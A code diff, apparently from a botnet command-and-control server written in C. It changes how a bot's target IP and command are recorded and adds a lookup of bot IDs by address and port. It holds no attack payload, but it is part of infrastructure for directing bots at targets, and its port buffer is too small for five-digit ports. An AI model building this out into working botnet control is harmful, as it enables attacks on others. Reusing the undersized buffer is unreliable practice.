@@ -65,6 +65,7 @@ int list_botnet(int active)
             printf("BOT_ID: %d \n", bot->bot_id);
         }
 
+
         bot = bot->next;
     }
 
@@ -372,9 +373,16 @@ void updateBotInfo(int bot_id, const char *target_ip, const char *command)
         {
 
             
-            // printf("%s",target_ip);
+            if(strcmp(target_ip,"") == 0){
 
-            ret = inet_pton(AF_INET, target_ip, &(bot->target_address));
+                ret = inet_pton(AF_INET, "0.0.0.0", &(bot->target_address));
+                
+            }else{
+                
+                ret = inet_pton(AF_INET, target_ip, &(bot->target_address));
+
+            }
+
             if(ret == 0){printf("Could not register address\n");}
             strcpy(bot->action, command);
 
@@ -388,4 +396,74 @@ void updateBotInfo(int bot_id, const char *target_ip, const char *command)
     {
         handle_error("Error in post sem w");
     }
+}
+
+int getBotID(const char * bot_ip, const char * bot_port ){
+
+    int res = -1;
+    int ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+
+    readcount++;
+
+    if (readcount == 1)
+    {
+
+        ret = sem_wait(&w);
+        if (ret < 0)
+        {
+            handle_error("Error in wait sem w");
+        }
+    }
+
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    active_bots *bot = botnet;
+
+     
+
+    while (bot != NULL)
+    {
+        char ip[INET_ADDRSTRLEN] = {0} ;
+        char port[sizeof(char) * 5] = {0} ;
+
+        inet_ntop(AF_INET, &(bot->bot_address), ip, INET_ADDRSTRLEN);
+        sprintf(port,"%ld",bot->port);
+
+        if (strcmp(ip,bot_ip)  == 0 && strcmp(port,bot_port) == 0)
+        {
+
+            res = bot->bot_id;
+            break;
+        }
+        bot = bot->next;
+    }
+
+    ret = sem_wait(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in wait sem r");
+    }
+    readcount--;
+    if (readcount == 0)
+        ret = sem_post(&w);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem w");
+    }
+    ret = sem_post(&r);
+    if (ret < 0)
+    {
+        handle_error("Error in post sem r");
+    }
+
+    return res;
+
 }
